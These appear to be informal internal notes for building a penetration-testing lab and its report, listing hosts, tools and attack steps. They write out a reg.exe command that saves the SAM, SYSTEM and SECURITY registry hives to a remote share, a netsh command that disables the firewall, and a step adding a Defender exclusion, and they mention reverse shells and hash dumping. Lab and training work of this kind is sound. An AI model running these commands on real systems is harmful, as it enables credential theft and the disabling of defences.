Internal Notes:

KALI - Confirm memory is 4 GB

ADMIN03: When we get Helen's password can we automatically connect to ADMIN02 or ADMIN01 given that Helen is a local admin on them?

MAIL01 - You may need to restart to get the reverse shell 

DMZ01 - You may need to log in first before you can Evil-WinRM connect


----------------------------------------------------------------------
Pentest Report Modifications

DEV01: Can we enable Apache and MySQL when we have a reverse shell as Daniela? (add to pentest report)
How can we separate Daniela and Ernesto into 2 different computers, so there's no setup after booting the VMs.


-------------------------
Afterward: 
DC01 - Run to make sure the 2 prompts at the beginning work

pentest-report.txt quarantined by Windows Defender
Ensure you set a defender exclusion before you unzip the project on your PC


-----------------------------------------------------------------------------------

For ligolo server, type "ifconfig" before "start"

At first, only gain access to a non-domain joined user. Then you can credential harvest to get domain user credentials.

ADMIN04 - Could we use impacket-secretsdump remotely, instead of reg.exe save hklm\sam sam.save hklm\system system.save hklm\security security.save \\10.10.14.10\


Could you use evil-winrm instead of impacket-wmiexec, on FILES01?



Change the ADMIN04 process so you use impacket-secretsdump to remotely dump the DCC2 hashes from ADMIN04.


Use hostnames instead of the IP



netsh advfirewall set allprofiles state off
(Did we use this?)


Can we use ligolo instead of chisel?


If you only have a local account, but you know domain creds, you can use "runas" and enumerate domain users.


How is it that we weren't able to RDP as Bernie even though he is a local admin?

If you upload a 1997-2003 word .doc file, but the victim has a newer version of word, will this work?

IDOR attacks on a web app?!?!

"Auto-logon" for Daneila on DEV01?

Deleted Files in Recycle Bin



Do any ports need to be open for sharphound capture to work?
